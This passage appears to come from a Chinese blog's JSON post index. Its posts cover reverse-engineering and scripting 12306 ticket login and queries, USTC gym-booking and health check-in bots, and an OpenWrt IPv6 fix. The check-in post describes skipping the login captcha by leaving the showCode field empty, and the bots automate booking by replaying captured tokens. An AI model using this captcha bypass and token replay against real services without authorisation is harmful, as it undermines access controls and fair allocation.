-->\n\n\n另一种SMS验证码登录，流程也非常简单，最后的身份认证过程与前面一模一样，不同的是，获取`apptk`的方式是通过账号、密码以及手机验证码，手机验证码的获取又依赖于身份证号后四位，因为比较容易，我就不啰嗦了，代码见`sms_login`函数。\n\n**用户密码前端加密方法**\n\n\n需要注意的是，12306在前端对用户的密码进行了一次加密，见此[JS文件](https://kyfw.12306.cn/otn/resources/js/framework/SM4.js)\n\n\n该文件提供了多个加密函数，为了弄清楚使用了哪一个，只需分析实现了登录逻辑的[JS文件](https://kyfw.12306.cn/otn/resources/js/login_new_v20210901.js)\n\n\n需要关注的内容如下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/f0d01866c7dba6f4a741a03d944d29df.png)\n我们发现，密码字段是这样生成的：\n\n```raw\n密文密码 = \"@\" + encrypt_ecb(明文密码, SM4_key)\n```\n\n可知用的函数是`encrypt_ecb`，另外还有一个参数是`SM4_key`，也可以在该JS文件中找到，其值为`tiekeyuankp12306`。\n\n\n接下来，只要想办法用Python调用`SM4.js`这个文件的加密函数，来为密码加密。\n\n但我试了一下，发现这段JS代码在Python下执行速度非常慢，最后我的解决办法是，直接用Python复现了一下这个加密过程，其实非常简单，因为SM4是有封装好的库的，[相关代码](https://github.com/windshadow233/12306/blob/main/bot/encrypt_ecb.py)。\n\n<!-- endtab -->\n\n{% endtabs %}\n\n如此，便实现了12306的登录。接下来，就可以分析购票的过程了。\n","tags":["JavaScript","Python","爬虫"],"categories":["瞎捣鼓经历"]},{"title":"Python实现12306购票（一）","url":"//blog/6477/","content":"\n12306号称反爬最强的网站，因此我小试了一下，花了几天时间，实现了脚本购票，并做了一个简单的cmd客户端。\n\n本项目只是实现了通过发送数据包请求来实现购票，并未优化抢票流程、速度，仅供娱乐与学习。\n\n从本文开始，将陆续分享几篇爬12306网站的经验和思路。首先，我并没有用到诸如`selenium`这类可以快速简化问题但运行速度极慢的模拟浏览器爬虫，而是用了`requests`库的无头请求方式。BTW，本文只分享思路，而不会涉及很多代码，若想查看完整代码，可访问下面仓库：\n\n{%link 12306,GitHub,https://github.com/windshadow233/12306 %}\n\n\n本文将分享其中最容易实现的功能：查询票务信息\n\n\n本文相关代码见[此文件](https://github.com/windshadow233/12306/blob/main/bot/tickets.py)\n\n\n众所周知，即使你没有登录，也可以在12306网站上查询票务信息，并且在爬取过程中需要注意的地方并不多，因此我觉得这个功能是最容易实现的。\n\n## 分析查票请求\n\n\n首先，打开12306查票主页面`https://kyfw.12306.cn/otn/leftTicket/init`，进行一次查票，查票之前，通过浏览器开发者工具进行抓包，容易抓到一条类似这样的请求：`https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=xxxxxx...`\n\n\n把该请求详细写出来如下：\n\n\n`GET https://kyfw.12306.cn/otn/leftTicket/query`\n\n\n参数：\n\n\n\n\n| 参数 | 说明 |\n| --- | --- |\n| leftTicketDTO.train_date | 日期（%Y-%m-%d格式） |\n| leftTicketDTO.from_station | 出发站编号 |\n| leftTicketDTO.to_station | 到达站编号 |\n| purpose_codes | 固定为“ADULT” |\n\n\n\n通常我们都选择成人票来进行搜索，故最后一个参数固定为ADULT，如果搜学生票，则需改成0X00\n\n请求的response是一个json类型的数据包，从其中就可以拿到车票的信息了。\n\n\n## 车站编号信息\n\n\n为了生成请求参数，我们还需要找到这些站点编号是哪里来的，重新访问查票网页，注意到一条名为`station_name.js?station_version=xxxx`的请求，点进去一看，果然其包含了所有站点名以及编号的对应，我们请求该文件，然后用正则匹配把站点一一匹配出来，即可获取一个站点—编号一一对应的字典。\n\n\n`GET https://kyfw.12306.cn/otn/resources/js/framework/station_name.js`\n\n\n正则匹配处理代码：\n\n\n\n```python\ndef _get_station_info(self):\n    r = self.sess.get(self.station_info_url)\n    info = re.findall('([\\u4e00-\\u9fa5]+)\\|([A-Z]+)', r.text)\n    return dict(info)\n```\n\n接下来，似乎就可以愉快的进行查票了！\n\n\n## 构造查票请求\n\n\n但是当我精心构造完GET请求数据包，用requests发起请求时，却得到了一个奇怪的响应，它是一个html响应，而不是我们前面抓到的json类型数据。\n\n\n难道是因为请求头不对被识别出来了？于是我加上了User-Agent、Host、Referer、Origin这四个请求头参数，再一次发起请求，这回居然拿到一个404响应。我：？？？\n\n\n看来应该是Cookie的原因了，为了快速拿到Cookie，我用前面建立的Session对`https://kyfw.12306.cn/otn/leftTicket/init`即查票主页面进行请求，这样session即可获取到站点的Cookie，然后再用这个session进行查票。用这个思路一尝试，果然就成功了。\n\n\n后来我发现，12306的票务信息API经常会发生改变，一会是`/otn/leftTicket/query`，一会是`/otn/leftTicket/queryT`，过两天又变成了`/otn/leftTicket/queryY`，这样老改代码也不是个办法，总得给他自动化一下，经过我的寻找，发现这个API是藏在前面的查票页面的网页中的：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/1ebcf2f8ce9b2dca538cfccbc0d6a51d.png)\n这样就非常的舒适了，前面正好需要对查票主页面进行一次没什么意义的GET请求来获取Cookie，现在正好可以把请求利用起来，可以用以下正则表达式把我们需要的内容匹配出来：\n\n\n\n```python\nr = self.sess.get('https://kyfw.12306.cn/otn/leftTicket/init')\nquery_path = re.search('CLeftTicketUrl = \\'(.+)\\'', r.text).groups()[0]\n```\n\n## 解析车票数据\n\n\n接下来，我们只需对拿到的json数据（如下图）进行分析，看看内容是啥样的即可。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/a3fce0290c1e9e6842562105a0abf134.png)\n下面取出一条内容：\n\n`4YiGZGyS45ITAXtZ9oM45%2Fo7G22plhxiYt6nb7giDW88jJPYHX8GAtu1nchaIfvirs5LcTPhbZkB%0AHL7%2BCQGbEfc4i4gNlHuaHNkxY3qwh21IEhJC8YXOt%2BwZx4sWhMpNkE8xnf8BsRVeQSOSEwg4unbV%0A9di7k%2BkNkUhVFY6eNNPMwQ8wXZLim9LndM%2F3fr3maEiS6eAw5AMjJixQd0yFBkvpPimAHVZremLN%0A1b9pUhN6qwKCsFQtrFiWTLaAwH1K2GzphWMl7wDhawfd7TtB6ZVJWOYjInL3fz9eLZ2BREeOYIgG%0ATVOJVfsOy4KoDDEl|预订|40000K11080H|K1105|NFF|SNH|HFH|SNH|03:32|12:40|09:08|Y|eyz3JL6Yiyf7NIlRRnbbW7ueaEK5dgdbxSVSs1rc7O5KCp1%2Ff8wvYZS%2BN0I%3D|20211018|3|F2|10|16|1|0||||无|||无||无|有|||||403010W0|4311|0|1||4023300000301520000010086000211008603000|0|||||1|#0#0|`\n\n\nemmmmm....好像有点乱七八糟，前面一大串似乎是加密了的什么信息（先打个mark，这个东西在以后会用到），但好在后面逐渐出现人话，于是，可以将后面的内容与信息做一下对应，就可以把票的信息解析出来了。\n\n\n这里的解析代码见文件中的`_parse_ticket_info`函数\n\n\n如此一来，我们就顺利拿到了票务信息数据，但当前我们还没有实现登录，拿到了信息之后只能看看，啥都做不了，下篇文章将分享一下登录功能的实现，共实现了二维码扫码登录和账号密码（需手机验证码）登录两种方法，滑块登录的前端加密过于复杂，有点超出我的能力范围了。。。以后有空再研究。\n","tags":["Python","爬虫"],"categories":["瞎捣鼓经历"]},{"title":"中科大羽毛球场预约小程序脚本","url":"//blog/6435/","content":"\n{%note info%}\n\n更新于2022-10-7：鉴于羽毛球馆预约平台已经更换，本文所述方法已失效。新平台也太难爬了。。。调用wx.login获取code以及后面调用wx云函数获取noise参数靠抓包似乎不大可行（我的水平太菜了），如果您有相关经验，可以在底下留言或者联系我。\n\n{%endnote%}\n\n前面已经爬过了蜗壳的健康打卡系统，因为该系统以网页作为前端，可以在浏览器直接打开分析，前端代码也没有出现复杂的逻辑，因此爬起来并没有遇到什么阻力。\n\n\n中校区体育场、游泳馆等建筑落成并开放后，吸引了一众学生前往进行各种体育活动，其中，位于综合馆的羽毛球场十分火爆，容易抢不到预约，因此我决定写个脚本来实现羽毛球场抢预约。\n\n\n小程序名为“中国科大中校区体育中心”，其主界面如下所示：\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpeg/38ebe23b84b42a8a2dac6dec6e2542d6.jpeg)拿到这么一个界面，我第一反应就是看一下主页的链接，结果发现它前端并不是h5，而是一个货真价实的小程序，不是用浏览器打开的，因此也就没有办法直接获取它的主页链接，基于此，我们需要一款抓包软件来直接分析其API接口。\n\n\n### 软件介绍\n\n\n抓包软件可以使用Fiddler、Charles等，这里我使用了Charles。Charles是一款付费软件，但可以被轻松破解，破解方法我这里就不介绍了，网上一搜一大把。后面内容都是针对Charles进行展开，不过其他抓包软件也是大同小异。\n\n\n在Charles中，需要开启SSL Proxying选项（依次选择Proxy->Start SSL Proxying），然后配置SSL Proxying（依次选择Proxy->SSL Proxying Settings），在Include栏下选择Add，然后添加Host和Port均为通配符：\\*。接下来配置代理端口（依次选择Proxy->Proxy Settings），可以看到Port默认为8888，若无冲突，可以不做修改。\n\n\n如果电脑是Windows或Mac系统，当然可以直接在上面登录PC版微信，在里面打开小程序进行抓包，可以省去下面手机配置代理的步骤。\n\n\n如果电脑系统不支持微信，在只能通过手机登录微信的情况下，我们将手机和电脑接入同一个局域网下，并在手机的局域网设置中，将HTTP代理服务器设置为电脑的局域网IP，端口设置为前面配置的代理端口8888。\n\n\n如果你是苹果手机，那么在Safari浏览器中打开网址：chls.pro/ssl，即可下载Charles提供的证书，将证书安装到手机上并添加信任，即配置完成。若不配置证书，会导致Charles抓到的HTTPS的包全部乱码，影响我们阅读内容。\n\n\n如果你是安卓系统，应该流程也差不多，不过我并没有用过，就不误导人了。\n\n\n---\n\n### 抓包分析\n\n\n配置完抓包软件及手机代理后，在手机上打开“中国科大中校区体育中心”小程序，进行登录，并进行一次手动预约，通过Charles记录到的数据包如下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/afd4750a8e09f3cd2d96e956426f1855.png)\n\n登录过程\n\n![](https://oss.fyz666.xyz/blogfiles/png/fbb0d4d15c3e55182f28024e3520505a.png)\n\n预约过程\n\n\n因为我们最终的目的是能顺利进行预约，因此先分析预约过程，看它需要提供哪些参数。首先容易找到预约操作的数据包是第二幅图中选中的submit，其请求头包含了一条疑似用于认证身份的token字段，如果将它删掉再提交请求，则会得到失败的响应。再看其表单内容：\n\n![](https://oss.fyz666.xyz/blogfiles/png/24d1ed21157d350ad49801d24c770136.png)\n下图是我手动提交预约的样子：\n\n![](https://oss.fyz666.xyz/blogfiles/jpeg/a06704690cb74b310e76b19145ad51b0.jpeg)\n对比二者，容易把字段关系对应起来，但有两个字段无法在其中对应上：gymnasiumId、timeQuantumId。经过我的研究，我发现gymnasiumId表示体育场的ID，羽毛球场的ID为1，因此在这里只要将它固定取1就好了；而timeQuantumId是时间段的ID，其对应关系如下：\n\n```python\n{\n    3: \"08:00-09:30\",\n    4: \"09:30-11:00\",\n    5: \"11:00-12:30\",\n    6: \"12:30-14:00\",\n    7: \"14:00-15:30\",\n    8: \"15:30-17:00\",\n    9: \"17:00-18:30\",\n    10: \"18:30-20:00\",\n    11: \"20:00-21:30\"\n}\n```\n\n不清楚为什么是从3开始。。。不过照着填就是了。\n\n\n---\n\n通过上述一顿分析，可以总结出预约的API如下：\n\n\n`POST https://cgyy.ustc.edu.cn/api/app/appointment/record/submit`\n\n\n提供的请求头中必须包含以下参数：\n\n\ntoken：一串由服务器提供的字符串，来源尚不明\n\n\n请求参数如下：\n\n\n| 参数 | 类型 | 说明 |\n| --- | --- | --- |\n| gymnasiumId | int | 固定为1 |\n| sportPlaceId | int | 场地号 |\n| timeQuantum | str | 预约时间段的字符串形式 |\n| timeQuantumId | int | 时间段对应的ID |\n| appointmentUserName | str | 预约人姓名 |\n| appointmentPeopleNumber | int | 入场人数 |\n| appointmentDay | str | 预约日期字符串 |\n| phone | str | 电话号码 |\n\n其中，预约人姓名和电话号码参数可以设置为空串，其他参数必须提供有效值。\n\n\n---\n\n分析完预约API，我们需要分析token的来源，它应该藏在登录过程的一堆数据包中。在Charles记录下的登录Session中，搜索token，得到以下结果：\n\n![](https://oss.fyz666.xyz/blogfiles/png/4e0b02d8273bbf1908b60e9e08da94d9.png)\n关注到一条Response Body中有token字段，双击打开该请求，发现内容如下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/2c54da2ef975585bf7a318a5d778c3df.png)\n该请求提供了两个参数，ticket与wxId，返回了一大串看上去很有意义的内容，其中就包含我们需要的token！（注：上图中的token看上去与前面预约时的token不同，这是因为我抓包的过程中不小心登录了两次，前面一个token过期了，其实两个token应该是相同的。）\n\n\n将这条请求进行重发，得到{\"msg\":\"登录失败\",\"code\":400}的响应，这说明ticket可能是一个只能使用一次的临时凭证。\n\n\n不论如何，我们得到了获取token的API：\n\n\n`POST https://cgyy.ustc.edu.cn/api/user/login`\n\n\n请求参数如下：\n\n\n| 参数 | 类型 | 说明 |\n| --- | --- | --- |\n| ticket | str | 一个字符串，疑似临时凭证，来源尚不明 |\n| wxId | str | 一个字符串，疑似小程序给予用户的唯一ID |\n\n---\n\n接下来，我们继续分析ticket的来源，眼尖的朋友估计已经发现了，它好像就在前面的某个图片中出现过。\n\n\n正是本文的第二张图片，我再把这张图贴一下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/afd4750a8e09f3cd2d96e956426f1855.png)\n在通过中科大passport进行CAS认证的请求中，在Response的Headers里面，出现了一个ticket（位于Location字段提供的URL中），这个ticket恰好也就是前面请求token时提供的ticket！（Response Headers提供的Location字段用以示意跳转到的链接）\n\n\n因此，我们可以通过CAS认证请求来获取ticket临时凭证。\n\n\n---\n\n最后还有一个wxId，这个参数好像不太容易获取，但我发现其实前面获取token的API，只提供ticket就够了，根本不需要wxId，大概是平台的bug。\n\n\n---\n\n### 流程与代码\n\n\n整体的流程就如上文所述，为了清晰起见，我画了一个简单的流程示意图：\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/8a01dfc0464cbdd333015de89631b20c.jpg)\n接下来简单贴一些核心代码。\n\n```python\ndef __init__(self):\n    self.login_bot = USTCPassportLogin()\n    self.sess = self.login_bot.sess\n    self.cas_url = 'https://passport.ustc.edu.cn/login?service=https://cgyy.ustc.edu.cn/validateLogin.html'\n    self.info_url = 'https://cgyy.ustc.edu.cn/api/app/sport/place/getAppointmentInfo'\n    self.token_url = 'https://cgyy.ustc.edu.cn/api/user/login'\n    self.submit_url = 'https://cgyy.ustc.edu.cn/api/app/appointment/record/submit'\n    self.cancel_url = 'https://cgyy.ustc.edu.cn/api/app/appointment/record/cancel/'\n\n    self.token = ''\n```\n\n依旧使用前面一篇文章中提供的登录脚本进行Passport的登录，我们在初始化中定义了几个URL，分别是预约平台的CAS认证链接（cas_url）、场地信息查询链接（info_url，关于场地信息的查询，比较容易，我就不再介绍，各位可以自己抓一下包）、获取token的链接（token_url）、提交预约链接（submit_url）、取消预约链接（cancel_url，同样比较容易）。\n\n\n以下按顺序给出各核心部分的代码：\n\n\n#### 登录\n\n\n登录后顺便获取token，存入`self.token`中。\n\n```python\ndef login(self, username, password):\n    \"\"\"\n    登录,需要提供用户名、密码，顺便返回后续表单需要提供的token\n    \"\"\"\n    self.token = ''\n    is_success = self.login_bot.login(username, password)\n    if is_success:\n        ticket = self._get_ticket()\n        self.token = self._get_token(ticket)\n    return is_success\n```\n\n#### 获取ticket\n\n```python\ndef _get_ticket(self):\n    response = self.sess.get(self.cas_url, allow_redirects=False)\n    url = response.headers.get('Location')\n    params = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query))\n    return params.get('ticket')\n```\n\n#### 获取token\n\n\n需要在请求头中放置\"content-type\": \"application/json\"，后面请求的data需要用`json.dumps`转为字符串。\n\n```python\ndef _get_token(self, ticket):\n    \"\"\"\n    获取token\n    \"\"\"\n    headers = {\n        \"content-type\": \"application/json\"\n    }\n    data = {\n        \"ticket\": ticket\n    }\n    r = self.sess.post(self.token_url, data=json.dumps(data), headers=headers)\n    return r.json().get('data').get('token')\n```\n\n#### 预约\n\n```python\ndef submit(self, gymnasium_id, sport_place_id, time_quantum_id,\n            user, people_number, appointment_day, phone):\n    data = {\n        \"gymnasiumId\": gymnasium_id,\n        \"sportPlaceId\": sport_place_id,\n        \"timeQuantum\": self.id2time[time_quantum_id],\n        \"timeQuantumId\": time_quantum_id,\n        \"appointmentUserName\": user,\n        \"appointmentPeopleNumber\": people_number,\n        \"appointmentDay\": appointment_day,\n        \"phone\": phone\n    }\n    headers = {\n        \"content-type\": \"application/json\",\n        \"token\": self.token\n    }\n    result = self.sess.post(self.submit_url, data=json.dumps(data), headers=headers).json()\n    code = result.get('code')\n    if code != 200:\n        return False, result.get('msg')\n    return True, result.get('data')\n```\n\n完整代码见下面仓库：\n\n{%link USTC-Gym-Appointment-Bot,GitHub,https://github.com/windshadow233/USTC-Gym-Appointment-Bot %}\n","tags":["Python","爬虫"],"categories":["瞎捣鼓经历"]},{"title":"用Python实现中科大健康打卡脚本","url":"//blog/6401/","content":"\n新冠疫情期间，学校规定假期必须每天进行健康打卡，汇报自身各项情况，在开学前未中断且打满14天才可申请返校，而开学后虽然不管，但原则上仍需每天打卡、每周报备。\n\n打卡？这辈子不可能手动打卡的，我决定写一个爬虫脚本来自动打卡。\n\n\n## 登录\n\n\n首先来分析一下打卡的登录逻辑：\n\n\n1. 打卡平台的网址是`https://weixine.ustc.edu.cn/2020/home`。\n2. 点进去发现其跳转到了`https://weixine.ustc.edu.cn/2020/login`，其中有一条“统一身份认证登录”。\n3. 点击“统一身份认证登录”，页面跳转到`https://passport.ustc.edu.cn/login?service=https%3A%2F%2Fweixine.ustc.edu.cn%2F2020%2Fcaslogin`，这是打卡平台在科大统一身份认证平台注册的CAS身份认证服务链接，我们在此需要输入科大Passport的账号密码，即可登录。\n\n因此，从这个逻辑可以得到，我们可以向上面第3点中的CAS身份认证URL发送包含登录信息的POST数据包，来实现登录。不过，事实上只要我们先在会话中登录了`https://passport.ustc.edu.cn`，即中科大身份认证系统，再对CAS认证URL直接发送GET请求，可以达到相同的效果，为了降低耦合，我选择了后面一种登录方法。\n\n\n因此，最终的登录逻辑化为以下两步：\n\n\n1. 向`https://passport.ustc.edu.cn/login`发送学号、密码等字段信息，使会话登录上中科大身份认证系统。\n2. 直接GET请求CAS认证链接：`https://passport.ustc.edu.cn/login?service=https%3A%2F%2Fweixine.ustc.edu.cn%2F2020%2Fcaslogin`进行打卡平台的CAS认证。\n\n登录界面如下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/741852fa5b00d54b11d3b538bc4d8655.png)\n接下来，在浏览器的F12界面中，对中科大身份认证系统的登录过程进行抓包：\n\n![](https://oss.fyz666.xyz/blogfiles/png/55b1f2f05457c2c6129727ab252e8344.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/76c4b551fd8af4c3eeb03d8a589299d3.png)\n发现登录过程向登录链接POST了不少内容，多试几次容易知道，其中的model、service、warn、button等参数都是固定的，showCode参数表示是否需要验证码，然而，直接把showCode取为空串就可以绕过验证码。username和password即学号、密码，用于校内身份认证（这里需要吐槽一下学校的身份认证系统居然还在使用明文传输密码，造成了很大的安全隐患）。\n\n\n另外，还有一个貌似临时凭证的CAS_LT参数，初看不容易摸索出它的规律，但实际上，CAS_LT正藏在`passport.ustc.edu.cn/login`这个网页中，如下图：\n\n![](https://oss.fyz666.xyz/blogfiles/png/ba42af97b6c6bb0b16482ded0494ab79.png)\n可以使用BeautifulSoup通过id把它找出来。\n\n\n## 打卡\n\n\n登录成功以后，我们对打卡系统的CAS链接：`https://passport.ustc.edu.cn/login?service=https%3A%2F%2Fweixine.ustc.edu.cn%2F2020%2Fcaslogin`发起一个GET请求，即可跳转到打卡网页：`https://weixine.ustc.edu.cn/2020/home`，我们先手动打一下卡，看看打卡系统是如何在请求中标识用户身份的。\n\n\n在Network选项卡下的众多内容中，有一条名为daliy_report的（真不是我不会拼daily这个单词），其提交表单部分内容如下：\n\n![](https://oss.fyz666.xyz/blogfiles/png/78ffe63d28067bd471902b47d11177c2.png)\n上面省略了一部分表单的内容，但容易发现，有一条内容明显与其他内容不同，就是这个_token。短期内多打几次卡，可以发现表单的_token不会发生变化，但重新登录以后，_token则会发生变化，很显然，它用于用户身份的标识，即告诉打卡平台的服务端这条打卡内容是来自哪个同学。既然_token出现在表单内容里，那大概率它就藏在网页的表单当中，找了一下，发现还真有：\n\n![](https://oss.fyz666.xyz/blogfiles/png/8db1ca38cdca670755d8a1cfc5ca12ec.png)\n那么身份标识的问题就解决了，顺便我们也把打卡的过程研究了一遍，其实就是提交这么一个表单到`https://weixine.ustc.edu.cn/2020/daliy_report`。\n\n\n---\n\n## 代码\n\n\n接下来开始着手写代码，首先实现登录过程。下面先定义passport登录链接。\n\n```python\nself.passport = \"https://passport.ustc.edu.cn/login\"\n```\n\n然后，由于前面这些请求之间并非独立的，而是依赖于共同的cookie，因此必须在同一个会话中发起，不能直接用requests自带的GET、POST方法来完成请求，所以我们需要先建立一个会话（requests.Session对象），使用会话的GET、POST方法。会话会主动维护一个cookie字典。\n\n```python\nself.sess = requests.session()\n```\n\n然后定义login的主函数：\n\n```python\ndef login(self, username, password):\n    \"\"\"\n    登录,需要提供用户名、密码\n    \"\"\"\n    self.sess.cookies.clear()\n    CAS_LT = self._get_cas_lt()\n    login_data = {\n        'username': username,\n        'password': password,\n        'warn': '',\n        'CAS_LT': CAS_LT,\n        'showCode': '',\n        'button': '',\n        'model': 'uplogin.jsp',\n        'service': ''\n    }\n    self.sess.post(self.passport, login_data, allow_redirects=False)\n    return self.sess.cookies.get(\"uc\") == username\n```\n\n逻辑非常简单，首先把会话的cookie清空，然后通过一个函数获取前文提到的CAS_LT参数，并构造POST表单，调用Session的POST方法，把它提交给passport登录链接，如果登录成功，会话的cookie中会多出一条键为\"uc\"、值为登录username的键值对，可以通过它来判断是否登录成功。\n\n\n接下来，来完善前面前面提到的函数：\n\n```python\ndef _get_cas_lt(self):\n    \"\"\"\n    获取登录时需要提供的验证字段\n    \"\"\"\n    response = self.sess.get(self.passport)\n    CAS_LT = BeautifulSoup(response.text, 'html.parser').find(attrs={'id': 'CAS_LT'}).get('value')\n    return CAS_LT\n```\n\n上述流程用Session去GET请求passport登录链接，在返回的html中即可获取到CAS_LT。\n\n\n以上即是登录过程的代码，接下来给出打卡的代码：\n\n```python\nself.login_bot = USTCPassportLogin()\nself.sess = self.login_bot.sess\n# CAS身份认证url\nself.cas_url = 'https://passport.ustc.edu.cn/login?service=https%3A%2F%2Fweixine.ustc.edu.cn%2F2020%2Fcaslogin'\n# 打卡url\nself.clock_in_url = 'https://weixine.ustc.edu.cn/2020/daliy_report'\nself.token = ''\n```\n\n健康打卡需要两个URL，第一个是打卡平台CAS身份认证的URL，在登录成功以后，对此URL进行请求，以完成CAS认证；第二个是打卡链接。同时，初始化一个login_bot，即为前面定义的登录类。最后初始化一个空字符串作为未登录状态下的token。\n\n\n打卡系统的登录过程如下：\n\n```python\ndef login(self, username, password):\n    \"\"\"\n    登录,需要提供用户名、密码\n    \"\"\"\n    self.token = ''\n    is_success = self.login_bot.login(username, password)\n    if is_success:\n        self.token = self._get_token()\n    return is_success\n```\n\n若登录成功了，则通过下面的_get_token方法获取到token。\n\n```python\ndef _get_token(self):\n    \"\"\"\n    获取打卡时需要提供的验证字段\n    \"\"\"\n    response = self.sess.get(self.cas_url)\n    s = BeautifulSoup(response.text, 'html.parser')\n    token = s.find(attrs={'name': '_token'}).get('value')\n    return token\n```\n\n在获取了token以后，我们终于可以进行打卡了：\n\n```python\ndef daily_clock_in(self, post_data_file):\n    \"\"\"\n    打卡函数，需要提供包含表单内容的json文件\n打卡成功返回True，打卡失败返回False\n    \"\"\"\n    with open(post_data_file, 'r') as f:\n        post_data = json.loads(f.read())\n    post_data['_token'] = self.token\n    response = self.sess.post(self.clock_in_url, data=post_data)\n    return self._check_success(response)\n```\n\n这里我们从一个JSON文件读取打卡需要的表单，然后在字典中加入_token，对打卡的URL发起POST请求即可，最后通过下面的_check_success方法，来检查是否成功打卡。\n\n```python\ndef _check_success(self, response):\n    \"\"\"\n    简单check一下有没有成功打卡、报备\n    \"\"\"\n    s = BeautifulSoup(response.text, 'html.parser')\n    msg = s.select('.alert')[0].text\n    return '成功' in msg\n```\n\n这是由于：\n\n![](https://oss.fyz666.xyz/blogfiles/png/209055bc68f0c9161caecb933c74de83.png)\n综上，我们已经完成了一个健康打卡的脚本，同理也可以实现每周的出校报备，完整的代码见我的GitHub项目：\n\n{%link USTC-Auto-Health-Report,GitHub,https://github.com/windshadow233/USTC-Auto-Health-Report %}\n\n\n最后，此脚本仅供学习，希望大家为自己和他人的健康负责，在自身健康状态良好的情况下合理使用脚本，切勿上报不实信息！\n","tags":["Python","爬虫"],"categories":["瞎捣鼓经历"]},{"title":"Lede（Stones）固件下游设备无法获取公网IPv6地址的解决方法","url":"//blog/6326/","content":"\n[前文](/blog/5405/)曾提到过OpenWrt通过relay（中继）模式使得自身以及下游设备从ISP运营商获取原生公网IPv6的方法，但我在Phicomm K3路由器上刷了lede（Stones）固件后，按照相同的配置方法竟无法让下游设备获取到公网IPv6地址。\n\n\n首先，家里的网络结构是通过一台光猫进行双栈拨号上网，路由器WAN口接到光猫LAN口，家里所有设备接入路由器的无线网络来进行上网。按照前面文章的方法进行配置后，我遇到的情况如下：\n\n\n- 路由器的WAN口确实通过光猫获取到了两个2409开头的IPv6 Global地址\n- 接入无线网络的设备均无法获取IPv6 Global地址，仅有一个Link-Local地址\n- 路由器虽有IPv6 Global地址，但无法ping通任何外网的IPv6地址\n\n接下来就是漫长的问题排查之路。\n\n\n首先我用电脑直接连接了光猫的WiFi，发现电脑可以获取到两个IPv6 Global地址，且可以ping通外网的IPv6，这说明光猫的配置以及拨号都没有问题。\n\n\n接下来登录路由器的命令行，查看IPv6网关的分配情况：\n\n![](https://oss.fyz666.xyz/blogfiles/png/7033de710c31ee9a554e01bf10b569c1.png)\nfe80::1正是光猫LAN口的IPv6 Link-Local地址，看上去好像没有毛病。\n\n\nping一下网关试试：\n\n```bash\nping6 fe80::1 -I eth0.2\n```\n\n发现果然（居然）ping不通，看来问题一定就出在这一点上了，路由器无法正常与网关通信，导致下游设备无法从ISP获取IPv6地址。\n\n\n那么为什么之前在Redmi AC2100刷入的OpenWrt，可以正常使用IPv6上网，现在刷的lede就不行呢，关于此，我查了不少资料。\n\n\n很多论坛博客中提到，需要将Network->Interfaces下LAN口和WAN、WAN6接口的Use builtin IPv6-management选项取消勾选，我一看，发现并没有勾选。\n\n\n另外还有博客提到，需要在Network->DHCP and DNS->Advanced Settings取消勾选“禁止解析IPv6”，我看了一下，我的管理界面中并没有这个选项，我也懒得去查该选项对应到文件里的字段是啥，因为这个选项的作用是禁止解析DNS的AAAA记录，即IPv6地址，勾选此项最多导致DNS解析IPv6失败，理论上并不会导致路由器ping不通网关。\n\n\n黔驴技穷之时，我想到有可能是某些软件的配置与IPv6冲突了，毕竟这款固件自带的软件非常之多，其中有不少是开机自启的，指不定就有哪个软件产生了冲突。上网一查，果然发现有这么回事，即lede固件与IPv6冲突的问题，冲突的原因在于一个称为mwan3的东西，它是用来做负载均衡与多拨的，后来我在Github上查到了解决方法：[关于 mwan3 与 IPv6 冲突的问题](https://github.com/SuLingGG/OpenWrt-Rpi/issues/3)，跟着他操作了一遍，就把问题解决了！（上面这个链接已经无了，建议自己上谷歌搜索，或者参考下面的方法）。\n\n\n既然前面链接404了，我就在此简单记录一下解决方法：\n\n\n1. 打开文件`/lib/mwan3/mwan3.sh`，将第7行的`IPT6=\"ip6tables -t mangle -w\"`为`IPT6=\"/bin/true\"`\n2. 进入luci页面，依次选择Network->Load Balancing->Policy，将Last resort修改为default (use main routing table)\n3. 继续选择该页Rules选项卡，增加一条default_rule，Source address填入局域网ipv4的网段，例如如果你的局域网是192.168.1.x这种样子的，就填192.168.1.0/24。Destination address填0.0.0.0/0，Protocol选择all，Policy assigned选择balanced。\n4. 重启路由器。\n5. 如果仍然不行，重启光猫。\n\n基于这次遇到的问题，我深刻意识到，以后还是得自己编译固件，这样才能充分考虑自己的需求，把自己需要的软件编进去。\n","tags":["Linux","IPv6","OpenWrt","计算机网络","路由器"],"categories":["Debug"]},{"title":"Phicomm K3刷OpenWrt","url":"//blog/6320/","content":"\n之前入手的Redmi AC2100在寝室用尚可，但在面积较大的环境里出现了信号较弱的现象（后来我才了解到小米路由器的口碑不大行）。\n\n另外，Redmi AC2100在性能上存在瓶颈（只有128MB内存，稍微跑点其他程序，内存就吃紧了），因此我入手了标题中这款Phicomm K3路由器，其具有512MB的超大内存、拥有USB接口且可以自由刷机。\n\n![](https://oss.fyz666.xyz/blogfiles/jpeg/7eeb217e6291b767c1857bf6db3fc487.jpeg)\n\n图片中就是这款Phicomm K3路由器，外型十分独特。\n\n\n一开始，我只是想简简单单刷个OpenWrt，但简单了解一下之后，我发现这款路由器涉及到的固件版本之多，是我始料未及的，我花了点时间做了功课后总结得出，一共有以下五种固件：\n\n\n- 官方原版固件（原厂）\n- 官方改装版固件（官改）\n- 官方root固件（官root）\n- OpenWrt/lede\n- Merlin\n\n而其中，每一种固件又分好几种版本，不同的版本的特性也有所不同，刷机的方法也有区别，不过好在，有一位大佬早就帮忙总结好了：\n\n{%link 斐讯K3 官方固件root版本,tbvv.net,https://tbvv.net/posts/0101-k3.html 